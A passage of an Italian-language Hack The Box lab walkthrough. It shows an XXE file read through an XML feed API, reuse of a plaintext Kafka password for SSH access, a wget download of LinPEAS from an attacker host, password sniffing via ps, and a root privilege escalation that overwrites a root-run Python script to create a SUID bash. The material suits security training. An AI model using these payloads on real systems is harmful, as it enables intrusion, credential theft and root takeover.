curl -i -X POST http://10.129.87.41:8081/feeds/aidx -H "Content-Type: application/xml" --data-binary @xxe-passwd.xml
```

Recuperiamo il contenuto attraverso ClickHouse:

```
curl -sS -G -u svc_events http://db.htb-airport.htb/ --data-urlencode "query=SELECT flight_number FROM partner_feed.flightleg_json WHERE transaction_id='htb-xxe-passwd' FORMAT TSVRaw"
```

Il campo `flight_number` contiene ora le righe di `/etc/passwd`.

Tra gli account presenti individuiamo:

```
svc-infra:x:1000:1000:,,,:/home/svc-infra:/bin/bash
martin_cole:x:1001:1001:,,,:/home/martin_cole:/bin/bash
```

Abbiamo quindi identificato due account Linux con shell Bash.

Il primo, `svc-infra`, sembra un account di servizio, mentre `martin_cole` appare un account utente personale.

### 4.8 Conclusioni

La vulnerabilità XXE ci ha consentito di:

1. Inviare documenti XML controllati attraverso l'API HTTP.
    
2. Definire entità esterne mediante DTD.
    
3. Far leggere al parser file locali del sistema.
    
4. Recuperare il contenuto dei file attraverso ClickHouse.
    
5. Identificare gli account Linux presenti sulla macchina.
    

Disponiamo quindi di una primitiva di **arbitrary local file read**, limitata ai file accessibili dal processo che esegue il parser.

## 5. File Disclosure → Credenziali Kafka → Accesso SSH

### 5.1 Individuazione di Kafka

Nel punto 3, durante l'analisi delle tabelle ClickHouse, avevamo eseguito:

```bash
curl -sS -G -u svc_events http://db.htb-airport.htb/ --data-urlencode "query=SHOW CREATE TABLE partner_feed.flightleg_raw_kafka"
```

La risposta conteneva:

```sql
ENGINE = Kafka
SETTINGS
    kafka_broker_list = 'localhost:9092',
    kafka_topic_list = 'aidx.flightleg.raw.v1'
```

Queste informazioni ci dicono che l'applicazione utilizza **Apache Kafka**, un sistema che permette a diversi programmi di scambiarsi messaggi.

Vogliamo quindi cercare il file che definisce il servizio Kafka.

Su Linux, i servizi gestiti da systemd possono avere un file di configurazione nella directory:

```text
/etc/systemd/system/
```

Proviamo quindi a leggere:

```text
/etc/systemd/system/kafka.service
```

### 5.2 Lettura di kafka.service tramite XXE

Utilizziamo lo stesso file `xxe.xml` del punto precedente.

Apriamolo:

```bash
nano xxe.xml
```

Modifichiamo il percorso del file da leggere:

```xml
<!ENTITY xxe SYSTEM "file:///etc/systemd/system/kafka.service">
```

Modifichiamo anche l'identificativo della transazione:

```xml
<IATA_AIDX_FlightLegNotifRQ TransactionIdentifier="htb-kafka-service">
```

Il resto del documento rimane invariato.

```
<?xml version="1.0"?>
<!DOCTYPE IATA_AIDX_FlightLegNotifRQ [
  <!ENTITY xxe SYSTEM "file:///etc/systemd/system/kafka.service">
]>
<IATA_AIDX_FlightLegNotifRQ TransactionIdentifier="htb-kafka-service">
  <Originator Code="HTB"/>
  <FlightLeg>
    <LegIdentifier>
      <FlightNumber>&xxe;</FlightNumber>
    </LegIdentifier>
  </FlightLeg>
</IATA_AIDX_FlightLegNotifRQ>
```

Invieremo quindi il payload:

```bash
curl -i -X POST http://10.129.87.41:8081/feeds/aidx -H "Content-Type: application/xml" --data-binary @xxe.xml
```

Recuperiamo il risultato tramite ClickHouse:

```bash
curl -sS -G -u svc_events http://db.htb-airport.htb/ --data-urlencode "query=SELECT flight_number FROM partner_feed.flightleg_json WHERE transaction_id='htb-kafka-service' FORMAT TSVRaw"
```

Otteniamo il contenuto di `kafka.service`.

Tra le righe più interessanti troviamo:

```ini
[Service]
User=svc-infra
Group=svc-infra
WorkingDirectory=/opt/kafka_2.13-4.3.1
ExecStart=/opt/kafka_2.13-4.3.1/bin/kafka-server-start.sh /opt/kafka_2.13-4.3.1/config/server.properties
```

Abbiamo scoperto due cose importanti:

1. Kafka viene eseguito con l'utente Linux `svc-infra`.
    
2. Il file di configurazione utilizzato all'avvio è `server.properties`.
    

Il percorso completo di quest'ultimo è:

```text
/opt/kafka_2.13-4.3.1/config/server.properties
```

### 5.3 Lettura di server.properties

Proviamo a leggere anche questo file utilizzando la XXE.

Apriamo nuovamente:

```bash
nano xxe.xml
```

Modifichiamo l'entità:

```xml
<!ENTITY xxe SYSTEM "file:///opt/kafka_2.13-4.3.1/config/server.properties">
```

E cambiamo l'identificativo della transazione:

```xml
<IATA_AIDX_FlightLegNotifRQ TransactionIdentifier="htb-kafka-config">
```

```
<?xml version="1.0"?>
<!DOCTYPE IATA_AIDX_FlightLegNotifRQ [
  <!ENTITY xxe SYSTEM "file:///opt/kafka_2.13-4.3.1/config/server.properties">
]>
<IATA_AIDX_FlightLegNotifRQ TransactionIdentifier="htb-kafka-config">
  <Originator Code="HTB"/>
  <FlightLeg>
    <LegIdentifier>
      <FlightNumber>&xxe;</FlightNumber>
    </LegIdentifier>
  </FlightLeg>
</IATA_AIDX_FlightLegNotifRQ>
```

Invieremo il documento:

```bash
curl -i -X POST http://10.129.87.41:8081/feeds/aidx -H "Content-Type: application/xml" --data-binary @xxe.xml
```

Recuperiamo il risultato:

```bash
curl -sS -G -u svc_events http://db.htb-airport.htb/ --data-urlencode "query=SELECT flight_number FROM partner_feed.flightleg_json WHERE transaction_id='htb-kafka-config' FORMAT TSVRaw"
```

Esaminando il contenuto di `server.properties`, troviamo questa riga:

```properties
listener.name.sasl_plaintext.plain.sasl.jaas.config=org.apache.kafka.common.security.plain.PlainLoginModule required \
  user_svc_infra="Ny2hdpme$bwT3";
```

**Abbiamo trovato una password in chiaro!**

Le credenziali appartengono a un utente utilizzato da Kafka:

```text
Username: svc_infra
Password: Ny2hdpme$bwT3
```

### 5.4 Tentativo di accesso SSH

Ricordiamo due informazioni:

Dal file `/etc/passwd` abbiamo individuato l'utente Linux:

```text
svc-infra
```

Dal file `kafka.service` sappiamo che Kafka viene eseguito proprio con quell'account.

Ora abbiamo trovato una password associata all'utente Kafka:

```text
svc_infra
```

I due nomi sono quasi identici:

```text
Kafka: svc_infra
Linux: svc-infra
```

È quindi ragionevole verificare se la password di Kafka sia stata riutilizzata anche per l'account Linux.

Proviamo a collegarci tramite SSH:

```bash
ssh svc-infra@10.129.87.41
```

Quando viene richiesta la password, inseriamo:

```text
Ny2hdpme$bwT3
```

**L'autenticazione funziona e otteniamo una shell SSH!**

Verifichiamo l'utente:

```bash
whoami
```

Risultato:

```text
svc-infra
```

Controlliamo anche UID e gruppi:

```bash
id
```

Risultato:

```text
uid=1000(svc-infra) gid=1000(svc-infra) groups=1000(svc-infra),100(users)
```

Abbiamo ottenuto il primo accesso alla macchina come utente Linux.

### 5.5 Riepilogo

Riassumiamo i passaggi che ci hanno permesso di ottenere la shell:

1. Tramite ClickHouse scopriamo che l'applicazione utilizza Kafka.
    
2. Utilizziamo la XXE per leggere `/etc/systemd/system/kafka.service`.
    
3. Nel file troviamo il percorso di `server.properties`.
    
4. Utilizziamo nuovamente la XXE per leggere `server.properties`.
    
5. Nel file troviamo la password dell'utente Kafka `svc_infra`.
    
6. Proviamo la stessa password per l'account Linux `svc-infra`.
    
7. La password funziona e otteniamo accesso SSH.
    

Il risultato è:

```text
svc-infra@stream:~$
```

La vulnerabilità iniziale era la **XXE**, che ci ha permesso di leggere file locali. L'accesso SSH è stato possibile perché la password dell'utente Kafka era stata riutilizzata anche per l'account Linux.

Non abbiamo sfruttato una vulnerabilità di SSH: abbiamo effettuato un normale accesso utilizzando credenziali valide.
## 6. Enumerazione locale e LinPEAS

Dalla shell SSH:

```bash
id
sudo -l
uname -a
ls -la /home/
```

Risultati principali:

```text
uid=1000(svc-infra) gid=1000(svc-infra) groups=1000(svc-infra),100(users)
Sorry, user svc-infra may not run sudo on stream.
Linux stream 6.8.0-146-generic #146-Ubuntu SMP PREEMPT_DYNAMIC Thu Sep  3 16:12:30 UTC 2026 x86_64 x86_64 x86_64 GNU/Linux
```

La directory `/home/martin_cole` aveva permessi `750` ed era inaccessibile. Una ricerca di file leggibili appartenenti a `martin_cole` non ha restituito risultati.

Lanciamo [[linpeas]]:

```
# apriamo un server python nella cartella sulla macchina attaccante che contiene linpeas:
python3 -m htto.server 8000

# andiamo nella tabella tmp della macchina vittima
cd /tmp

# scarichiamo linpeas:
wget http://10.10.15.73:8000/linpeas.sh

# diamo i permessi di esecuzione:
chmod +x linpeas.sh

# lanciamo linpeas:
./linpeas.sh | tee linout.txt
```

LinPEAS ha evidenziato un servizio periodico interessante:

```
╔══════════╣ System timers (T1053.003)
╚ https://book.hacktricks.wiki/en/linux-hardening/processes-crontab-systemd-dbus/cron-and-systemd-timers.html#enumerate-schedules
══╣ Active timers: (T1053.003)
NEXT                             LEFT LAST                              PASSED UNIT                           ACTIVATES
Sat 2026-10-17 14:02:09 UTC        4s Sat 2026-10-17 14:00:09 UTC 1min 55s ago aidx-dlq-drainer.timer         aidx-dlq-drainer.service
Sat 2026-10-17 14:10:00 UTC      7min Sat 2026-10-17 14:00:09 UTC 1min 55s ago sysstat-collect.timer          sysstat-collect.service
```

verificato con:

```bash
systemctl cat aidx-dlq-drainer.service aidx-dlq-drainer.timer
```

```ini
# aidx-dlq-drainer.service
[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /opt/ops/dlq_drainer.py

# aidx-dlq-drainer.timer
[Timer]
OnBootSec=1min
OnUnitActiveSec=2min
AccuracySec=15s
```

**Osservazione chiave:** il drainer elabora periodicamente i messaggi della Dead Letter Queue AIDX **come root**.
Questo servizio gira in background su Linux e ha il compito di **leggere i messaggi di errore accumulati nella Dead Letter Queue (`dlq`), elaborarli, correggerli o salvarli in un database** per fare in modo che la coda non si riempia del tutto, garantendo la stabilità del server.
## 7. Analisi di `dlq_drainer.py`

Lo script `/opt/ops/dlq_drainer.py` era leggibile ma non modificabile da `svc-infra` (`root:root`). Esaminandolo abbiamo trovato due passaggi critici.

### 7.1 Esecuzione di un formatter Python esterno

```python
FORMATTER = os.environ.get(
    "AIDX_FORMATTER", "/var/lib/clickhouse/user_files/aidx_quarantine.py"
)

def _format(raw):
    p = subprocess.run(["python3", FORMATTER], input=raw,
                       capture_output=True, check=False)
```

Il drainer root esegue `aidx_quarantine.py` come codice Python per ogni messaggio consumato dalla DLQ. Il file si trova nella directory `user_files` di ClickHouse.

### 7.2 Credenziali ClickHouse esposte nella command line

```python
CH_PW_FILE = "/etc/partner-sync/ch.pw"

subprocess.run([
    "clickhouse-client", "--user", "default",
    "--password", _pw(), "-q", q
], check=False)
```

`ch.pw` era leggibile soltanto da root (`600`), ma lo script passava la password come argomento al comando `clickhouse-client`. Gli argomenti dei processi possono essere osservabili da altri utenti con `ps`, almeno per un breve intervallo prima dell'eventuale mascheramento.
## 8. DLQ controllabile e recupero della password ClickHouse `default`

### 8.1 Cosa abbiamo scoperto?

Durante l'enumerazione della macchina con LinPEAS abbiamo individuato un servizio chiamato:

```
aidx-dlq-drainer.service
```

Il servizio legge i messaggi presenti in un topic Kafka chiamato:

```
aidx.flightleg.dlq.v1
```

DLQ significa _Dead Letter Queue_: una coda nella quale vengono inseriti i messaggi che non è stato possibile elaborare correttamente.

Il servizio è interessante per due motivi:

1. Viene eseguito con i privilegi di **root**.
    
2. Per registrare i messaggi nel database, utilizza ClickHouse con l'utente `default`.
    
### 8.2 Perché il servizio viene eseguito ogni due minuti?

Durante l'enumerazione abbiamo individuato anche il file:

```
/etc/systemd/system/aidx-dlq-drainer.timer
```

Su Linux, un _timer systemd_ permette di avviare automaticamente un servizio a intervalli prestabiliti.

Leggiamo il file:

```
cat /etc/systemd/system/aidx-dlq-drainer.timer
```

La sua configurazione contiene:

```
[Timer]
OnBootSec=1min
OnUnitActiveSec=2min
AccuracySec=15s
```

Il significato è:

|Direttiva|Significato|
|---|---|
|`OnBootSec=1min`|Primo avvio circa un minuto dopo l'avvio del sistema|
|`OnUnitActiveSec=2min`|Successivi avvii circa due minuti dopo l'ultima attivazione del servizio|
|`AccuracySec=15s`|Consente a systemd una tolleranza di 15 secondi nella pianificazione|

Il file del servizio, invece, contiene:

```
[Service]
Type=oneshot
User=root
ExecStart=/usr/bin/python3 /opt/ops/dlq_drainer.py
```

Questo significa che, ogni volta che il timer attiva il servizio, viene eseguito come root lo script Python:

```
/opt/ops/dlq_drainer.py
```

Lo script controlla la DLQ per circa 10 secondi, elaborando i messaggi eventualmente presenti.
### 8.3 Perché ci interessa lo script dlq_drainer.py?

Esaminiamo lo script:

```
cat /opt/ops/dlq_drainer.py
```

Tra le istruzioni presenti troviamo:

```
CH_PW_FILE = "/etc/partner-sync/ch.pw"
```

La password ClickHouse viene letta dal file `/etc/partner-sync/ch.pw`.

Troviamo inoltre:

```
subprocess.run([
    "clickhouse-client",
    "--user", "default",
    "--password", _pw(),
    "-q", q
], check=False)
```

Questo codice avvia `clickhouse-client` utilizzando:

- Username: `default`
    
- Password: letta dal file `ch.pw`
    
- Query SQL: contenuta nella variabile `q`
    

Il problema è che la password viene passata come **argomento del comando**.

Anche se non possiamo leggere direttamente il file `ch.pw`, possiamo provare a osservare il processo mentre viene eseguito.

Su Linux il comando `ps` permette infatti di visualizzare i processi attivi e i loro argomenti, quando le autorizzazioni del sistema lo consentono.

Per provocare l'esecuzione di `clickhouse-client`, dobbiamo far elaborare al servizio almeno un messaggio Kafka.

Nel punto 5 abbiamo letto il file:

```
/etc/systemd/system/kafka.service
```

All'interno avevamo individuato:

```
WorkingDirectory=/opt/kafka_2.13-4.3.1
ExecStart=/opt/kafka_2.13-4.3.1/bin/kafka-server-start.sh /opt/kafka_2.13-4.3.1/config/server.properties
```

Questo ci aveva permesso di scoprire che Apache Kafka era installato nella directory:

```
/opt/kafka_2.13-4.3.1/
```

Lo script di avvio si trova nella sottodirectory:

```
/opt/kafka_2.13-4.3.1/bin/
```

Le installazioni standard di Apache Kafka includono in questa directory diversi strumenti per interagire con il broker.

Possiamo verificarne la presenza con:

```
ls /opt/kafka_2.13-4.3.1/bin/
```

Tra gli strumenti presenti troviamo:

```
kafka-server-start.sh
kafka-console-producer.sh
kafka-console-consumer.sh
kafka-consumer-groups.sh
```

I due programmi che ci interessano sono:

|Programma|A cosa serve|
|---|---|
|`kafka-console-producer.sh`|Invia messaggi a un topic Kafka|
|`kafka-consumer-groups.sh`|Mostra informazioni sui gruppi di consumer e sui messaggi ancora da elaborare|
### 8.4 Invio di un messaggio alla DLQ

Siamo collegati alla macchina tramite SSH con l'utente `svc-infra`.

Proviamo a inserire un messaggio nel topic:

```
echo 'HTB-DLQ-TEST' | /opt/kafka_2.13-4.3.1/bin/kafka-console-producer.sh --bootstrap-server 127.0.0.1:9092 --topic aidx.flightleg.dlq.v1
```

Il comando si può dividere in tre parti.

**1. Prepariamo un messaggio:**

```
echo 'HTB-DLQ-TEST'
```

**2. Lo inviamo al broker Kafka:**

```
--bootstrap-server 127.0.0.1:9092
```

Utilizziamo la porta `9092`, già individuata durante l'analisi della configurazione Kafka.

**3. Specifichiamo il topic:**

```
--topic aidx.flightleg.dlq.v1
```

Questo è il topic letto dal servizio `aidx-dlq-drainer`.

Il comando funziona: possiamo quindi inserire messaggi nella DLQ.

### 8.5 Come utilizziamo kafka-consumer-groups.sh?

Vogliamo verificare che i messaggi inviati vengano effettivamente letti.

Nel codice dello script `dlq_drainer.py` abbiamo individuato:

```
GROUP_ID = os.environ.get("GROUP_ID", "aidx-dlq-drainer")
```

Questo indica che il servizio utilizza il gruppo di consumer:

```
aidx-dlq-drainer
```

Possiamo quindi controllare lo stato del gruppo utilizzando `kafka-consumer-groups.sh`, lo strumento trovato nella directory `bin` di Kafka.

Eseguiamo:

```
/opt/kafka_2.13-4.3.1/bin/kafka-consumer-groups.sh --bootstrap-server 127.0.0.1:9092 --describe --group aidx-dlq-drainer
```

Le opzioni sono:

|Opzione|Significato|
|---|---|
|`--bootstrap-server`|Indirizzo del broker Kafka|
|`--describe`|Mostra informazioni sul gruppo|
|`--group`|Specifica il gruppo di consumer da esaminare|

Nel risultato osserviamo che il gruppo raggiunge l'ultimo offset disponibile:

```
LAG = 0
```

`LAG` indica quanti messaggi rimangono da consumare.

Quando il valore è `0`, significa che il gruppo ha raggiunto la fine del topic.

**Abbiamo quindi confermato che il servizio consuma i messaggi che inseriamo nella DLQ.**

### 8.6 Intercettazione della password con ps

Ora sappiamo che:

- Possiamo inserire messaggi nella DLQ.
    
- Il servizio li elabora periodicamente come root.
    
- Durante l'elaborazione viene eseguito `clickhouse-client` con la password nella riga di comando.
    

Per intercettare la password utilizziamo due terminali SSH.

**Terminale 1 — Monitoraggio dei processi**

Nel primo terminale eseguiamo:

```
while true; do ps -eww -o user,args | grep '[c]lickhouse-client --user default'; sleep 0.01; done
```

Questo comando controlla continuamente i processi attivi, cercando quelli che contengono:

```
clickhouse-client --user default
```

Il controllo viene ripetuto ogni 0,01 secondi, per aumentare la probabilità di osservare il processo durante la sua breve esecuzione.

Lasciamo il comando in esecuzione.

**Terminale 2 — Invio di più messaggi**

Nel secondo terminale eseguiamo:

```
for i in {1..10}; do echo "HTB-DLQ-TEST-$i"; done | /opt/kafka_2.13-4.3.1/bin/kafka-console-producer.sh --bootstrap-server 127.0.0.1:9092 --topic aidx.flightleg.dlq.v1
```

Questo comando invia dieci messaggi alla DLQ.

Perché dieci anziché uno solo?

Perché lo script `dlq_drainer.py` esegue una query ClickHouse per ciascun messaggio elaborato.

Inviando più messaggi provochiamo più esecuzioni di `clickhouse-client`, aumentando le possibilità di intercettare la password.

Attendiamo che il timer systemd avvii nuovamente il servizio, indicativamente entro i due minuti successivi.

### 8.7 Recupero della password

Nel primo terminale compare, per un breve istante:

```
root     clickhouse-client --user default --password N3v3rs33nD4T4 -q INSERT INTO aidx_ops.failed_ingest (id, reason, byte_len, root_tag, preview, quarantine_path, received_at) VALUES ('94f3faf7e0c04e9fb52e7a7323b72559', 'unknown', 14, 'UNKNOWN', 'HTB-DLQ-TEST-1', '/var/lib/aidx/quarantine/1792248256_9621fcc4.xml', now())
```

Questa riga ci fornisce tutte le informazioni necessarie.

Il programma viene eseguito da root e utilizza le credenziali:

```
Username: default
Password: N3v3rs33nD4T4
```

La password rimane visibile soltanto per un intervallo molto breve, perché `clickhouse-client` successivamente la nasconde negli argomenti del processo.

Il monitoraggio continuo ci ha permesso di intercettarla prima che venisse nascosta.

### 8.8 Accesso a ClickHouse come default

Proviamo ad autenticarci utilizzando le credenziali recuperate:

```
clickhouse-client --user default --password
```

Quando viene richiesta la password, inseriamo:

```
N3v3rs33nD4T4
```

L'autenticazione funziona.

Controlliamo i privilegi:

```
SHOW GRANTS;
```

L'utente `default` dispone di privilegi molto più estesi rispetto a `svc_events`, compreso l'accesso alle funzionalità di lettura e scrittura dei file attraverso ClickHouse.

### 8.9 Riepilogo

Il percorso seguito è stato:

1. Tramite LinPEAS individuiamo `aidx-dlq-drainer.service`.
    
2. Leggiamo il timer e scopriamo che il servizio viene avviato indicativamente ogni due minuti.
    
3. Analizziamo lo script Python e scopriamo che utilizza `clickhouse-client` passando la password come argomento.
    
4. Dal percorso di installazione Kafka, già individuato in `kafka.service`, troviamo gli strumenti `kafka-console-producer.sh` e `kafka-consumer-groups.sh`.
    
5. Inviamo un messaggio alla DLQ e verifichiamo che venga consumato.
    
6. Apriamo due terminali SSH: uno per monitorare i processi, l'altro per inviare messaggi.
    
7. Durante l'elaborazione intercettiamo la password dell'utente ClickHouse `default`.
    
8. Utilizziamo la password per accedere a ClickHouse con privilegi elevati.
    

**Il punto fondamentale:** non siamo riusciti a leggere direttamente il file contenente la password, ma abbiamo sfruttato il fatto che un servizio eseguito come root la passava temporaneamente sulla riga di comando di `clickhouse-client`, rendendola osservabile attraverso `ps`.
## 9. ClickHouse `default`: lettura e scrittura dei file

### 9.1 Accesso a ClickHouse come default

Nel punto precedente siamo riusciti a recuperare la password dell'utente ClickHouse `default`:

```
Username: default
Password: N3v3rs33nD4T4
```

Siamo ancora collegati alla macchina tramite SSH come `svc-infra`.

Proviamo ad accedere a ClickHouse:

```
clickhouse-client --user default --password
```

Inseriamo la password quando viene richiesta.

L'autenticazione funziona e possiamo eseguire comandi SQL direttamente su ClickHouse.

### 9.2 Verifica dei privilegi

Controlliamo quali permessi possiede l'utente `default`:

```
SHOW GRANTS;
```

Il risultato mostra che l'account possiede privilegi molto più elevati rispetto all'utente `svc_events` utilizzato in precedenza.

Tra questi troviamo anche il privilegio `FILE`.

**Perché è importante?**

ClickHouse dispone di una funzione chiamata `file()` che permette di leggere e scrivere file sul server.

Questa funzione, in genere, opera all'interno della directory:

```
/var/lib/clickhouse/user_files/
```

Con l'utente `svc_events` non potevamo utilizzarla liberamente. Con `default`, invece, possiamo farlo.

### 9.3 Individuazione del file Python

Nel punto 7 avevamo analizzato lo script:

```
/opt/ops/dlq_drainer.py
```

Ricordiamo due istruzioni importanti:

```
FORMATTER = os.environ.get(
    "AIDX_FORMATTER",
    "/var/lib/clickhouse/user_files/aidx_quarantine.py"
)
```

e:

```
subprocess.run(["python3", FORMATTER], input=raw, capture_output=True, check=False)
```

Queste istruzioni ci dicono che il servizio `aidx-dlq-drainer` esegue uno script Python chiamato:

```
/var/lib/clickhouse/user_files/aidx_quarantine.py
```

Il dettaglio fondamentale è che **il servizio** `**aidx-dlq-drainer**` **viene eseguito come root**.

Quindi abbiamo una situazione interessante:

- ClickHouse `default` può modificare file nella directory `user_files`.
    
- Il servizio root esegue uno script Python presente proprio in quella directory.
    

Se riusciamo a modificare lo script, possiamo fare in modo che root esegua le istruzioni che abbiamo inserito.

### 9.4 Lettura del file Python

Proviamo a leggere `aidx_quarantine.py` direttamente da ClickHouse:

```
SELECT * FROM file('aidx_quarantine.py', 'LineAsString', 'line String') FORMAT TSVRaw;
```

Spiegazione:

|Elemento|Significato|
|---|---|
|`file('aidx_quarantine.py', ...)`|Legge il file presente nella directory `user_files`|
|`LineAsString`|Legge una riga alla volta|
|`line String`|Considera ogni riga come una stringa|
|`FORMAT TSVRaw`|Mostra il contenuto senza formattazioni aggiuntive|

La query funziona e restituisce il contenuto del file Python.

Lo script originale si limita a leggere un messaggio XML e ricavarne alcune informazioni, come la lunghezza, il tag iniziale e un'anteprima.

Non contiene istruzioni per eseguire direttamente comandi scelti da noi.

**La nostra possibilità di attacco dipende quindi dal riuscire a modificarlo.**

### 9.5 Verifica della possibilità di scrivere file

Prima di modificare lo script originale, facciamo una prova su un file innocuo.

Creiamo un file di testo tramite ClickHouse:

```
INSERT INTO FUNCTION file('htb_write_test.txt', 'LineAsString', 'line String') VALUES ('HTB-WRITE-OK');
```

Verifichiamo il contenuto:

```
SELECT * FROM file('htb_write_test.txt', 'LineAsString', 'line String');
```

Otteniamo:

```
HTB-WRITE-OK
```

Abbiamo dimostrato che ClickHouse può creare un file nella directory `user_files`.

### 9.6 Verifica della sovrascrittura

Ora vogliamo verificare se possiamo anche sostituire il contenuto di un file esistente.

Eseguiamo:

```
SET engine_file_truncate_on_insert = 1;
```

Questa impostazione permette di svuotare il file di destinazione prima di scrivere il nuovo contenuto.

Proviamo a sostituire il testo precedente:

```
INSERT INTO FUNCTION file('htb_write_test.txt', 'LineAsString', 'line String') VALUES ('HTB-OVERWRITE-OK');
```

Controlliamo:

```
SELECT * FROM file('htb_write_test.txt', 'LineAsString', 'line String');
```

Il risultato è:

```
HTB-OVERWRITE-OK
```

Il vecchio testo è scomparso.

**Abbiamo quindi confermato che l'utente ClickHouse** `default` **può sovrascrivere un file esistente nella directory** `user_files`**.**

Questo è il risultato più importante della fase: adesso sappiamo che possiamo modificare il file Python eseguito dal servizio root.

---

## 10. Privilege Escalation: esecuzione di Python come root

### 10.1 Il nostro obiettivo

Abbiamo individuato questa situazione:

1. Il servizio `aidx-dlq-drainer` viene eseguito come root.
    
2. Il servizio legge i messaggi dal topic Kafka `aidx.flightleg.dlq.v1`.
    
3. Quando elabora un messaggio, esegue lo script Python `aidx_quarantine.py`.
    
4. Possiamo modificare questo script tramite ClickHouse.
    

L'idea è semplice:

**Modifichiamo lo script Python affinché, quando viene eseguito da root, crei per noi una copia di Bash con il bit SUID attivo.**

Potremo quindi utilizzare questa copia per ottenere una shell con privilegi root.

### 10.2 Backup dello script originale

Prima di modificare il file, creiamo una copia di sicurezza.

Dalla console ClickHouse eseguiamo:

```
INSERT INTO FUNCTION file('aidx_quarantine.py.bak', 'LineAsString', 'line String') SELECT line FROM file('aidx_quarantine.py', 'LineAsString', 'line String');
```

Il comando crea:

```
/var/lib/clickhouse/user_files/aidx_quarantine.py.bak
```

contenente il codice originale.

In questo modo potremo ripristinare il file dopo aver completato l'esercizio.

### 10.3 Preparazione del codice Python

Vogliamo sostituire il contenuto di `aidx_quarantine.py` con questo codice:

```
import os, sys, shutil
shutil.copyfile("/bin/bash", "/opt/aidx-pipeline/.rootbash")
os.chmod("/opt/aidx-pipeline/.rootbash", 0o4755)
raw = sys.stdin.buffer.read()
print(str(len(raw)) + chr(9) + "UNKNOWN" + chr(9) + "HTB")
```

Vediamo cosa fa.

**Prima istruzione:**

```
import os, sys, shutil
```

Importa le librerie Python necessarie.

**Seconda istruzione:**

```
shutil.copyfile("/bin/bash", "/opt/aidx-pipeline/.rootbash")
```

Copia il programma Bash in un nuovo file chiamato `.rootbash`.

Quando questa istruzione verrà eseguita dal servizio root, il nuovo file verrà creato con proprietario root.

**Terza istruzione:**

```
os.chmod("/opt/aidx-pipeline/.rootbash", 0o4755)
```

Imposta i permessi `4755` sul file `.rootbash`.

Il numero `4` iniziale attiva il **bit SUID**.

Su un file eseguibile di proprietà di root, questo bit permette a un altro utente di avviare il programma con i privilegi effettivi del proprietario.

**Ultime due istruzioni:**

```
raw = sys.stdin.buffer.read()
print(str(len(raw)) + chr(9) + "UNKNOWN" + chr(9) + "HTB")
```

Leggono il messaggio ricevuto dalla DLQ e restituiscono tre valori separati da tabulazioni.

Questo mantiene il formato di output atteso dal servizio `aidx-dlq-drainer`.

### 10.4 Sovrascrittura di aidx_quarantine.py

Ora dobbiamo inserire il nostro codice Python nel file originale.

Dalla console ClickHouse eseguiamo:

```
SET engine_file_truncate_on_insert = 1;
```

Poi:

```
INSERT INTO FUNCTION file('aidx_quarantine.py', 'LineAsString', 'line String')
VALUES
('import os, sys, shutil'),
('shutil.copyfile("/bin/bash", "/opt/aidx-pipeline/.rootbash")'),
('os.chmod("/opt/aidx-pipeline/.rootbash", 0o4755)'),
('raw = sys.stdin.buffer.read()'),
('print(str(len(raw)) + chr(9) + "UNKNOWN" + chr(9) + "HTB")');
```

Ogni valore SQL rappresenta una riga del nostro programma Python.

Verifichiamo che il file sia stato modificato correttamente:

```
SELECT * FROM file('aidx_quarantine.py', 'LineAsString', 'line String') FORMAT TSVRaw;
```

Il risultato contiene il nostro codice.

**Abbiamo quindi sostituito lo script che verrà eseguito dal servizio root.**

### 10.5 Come facciamo eseguire il nostro codice a root?

Ricordiamo che il servizio `aidx-dlq-drainer` viene attivato dal timer systemd circa ogni due minuti.

Quando viene avviato, legge i messaggi presenti nella DLQ e richiama lo script Python `aidx_quarantine.py`.

Dobbiamo quindi inserire un messaggio nella DLQ.

Usciamo dalla console ClickHouse:

```
exit;
```

Dalla shell SSH come `svc-infra` eseguiamo:

```
echo 'HTB-ROOT-TEST' | /opt/kafka_2.13-4.3.1/bin/kafka-console-producer.sh --bootstrap-server 127.0.0.1:9092 --topic aidx.flightleg.dlq.v1
```

Questo comando inserisce il messaggio `HTB-ROOT-TEST` nella coda Kafka.

Quando il timer attiva nuovamente il servizio:

1. `aidx-dlq-drainer` si avvia come root.
    
2. Legge il nostro messaggio dalla DLQ.
    
3. Esegue il file `aidx_quarantine.py`.
    
4. Il file contiene il nostro codice Python.
    
5. Il codice crea `/opt/aidx-pipeline/.rootbash` e imposta il bit SUID.
    

In sostanza, **abbiamo fatto eseguire a root un programma che abbiamo modificato noi**.

### 10.6 Verifica della creazione del file SUID

Attendiamo il successivo avvio del timer, quindi verifichiamo se `.rootbash` è stato creato:

```
ls -l /opt/aidx-pipeline/.rootbash
```

Il file deve risultare di proprietà di root e avere il bit SUID attivo.

Un risultato coerente è:

```
-rwsr-xr-x 1 root root ... /opt/aidx-pipeline/.rootbash
```

Osserviamo la prima parte:

```
-rwsr-xr-x
```

La lettera `s` al posto della normale `x` nei permessi del proprietario indica che il bit SUID è attivo.

### 10.7 Ottenimento della shell root

Ora eseguiamo la copia di Bash:

```
/opt/aidx-pipeline/.rootbash -p
```

L'opzione `-p` fa sì che Bash mantenga i privilegi effettivi ottenuti tramite il bit SUID.

Verifichiamo:

```
id
# uid=1000(svc-infra) gid=1000(svc-infra) euid=0(root) groups=1000(svc-infra),100(users)
whoami
# root
```

Il risultato conferma che la shell possiede privilegi effettivi di root (`euid=0`).

**Privilege escalation riuscita!**

Siamo passati dall'utente Linux `svc-infra` a una shell con privilegi root.

Nella cartella `/home/martin_cole` troviamo la user flag.
Nella cartella `/root` troviamo la root flag.
### 10.8 Perché questa privilege escalation ha funzionato?

La vulnerabilità nasce dal fatto che un servizio privilegiato esegue un file che può essere modificato attraverso un altro servizio.

La situazione è questa:

```
Utente Linux svc-infra
          |
          v
Accesso a ClickHouse come default
          |
          v
Sovrascrittura di aidx_quarantine.py
          |
          v
Invio di un messaggio alla DLQ
          |
          v
Timer systemd (circa ogni 2 minuti)
          |
          v
aidx-dlq-drainer eseguito come root
          |
          v
Esecuzione del nostro codice Python
          |
          v
Creazione di .rootbash con bit SUID
          |
          v
.rootbash -p
          |
          v
SHELL ROOT
```

Il problema non è una vulnerabilità di Python, Bash o del kernel Linux.

**Il problema è che un servizio eseguito come root si fida di uno script modificabile attraverso ClickHouse.**

Abbiamo sfruttato questo errore di configurazione per fare eseguire il nostro codice con privilegi elevati.

### 10.9 Conclusioni

La privilege escalation è stata possibile attraverso questa sequenza:

1. Recuperiamo la password ClickHouse `default`.
    
2. Scopriamo che l'account dispone del privilegio `FILE`.
    
3. Verifichiamo che possiamo leggere e sovrascrivere file nella directory `user_files`.
    
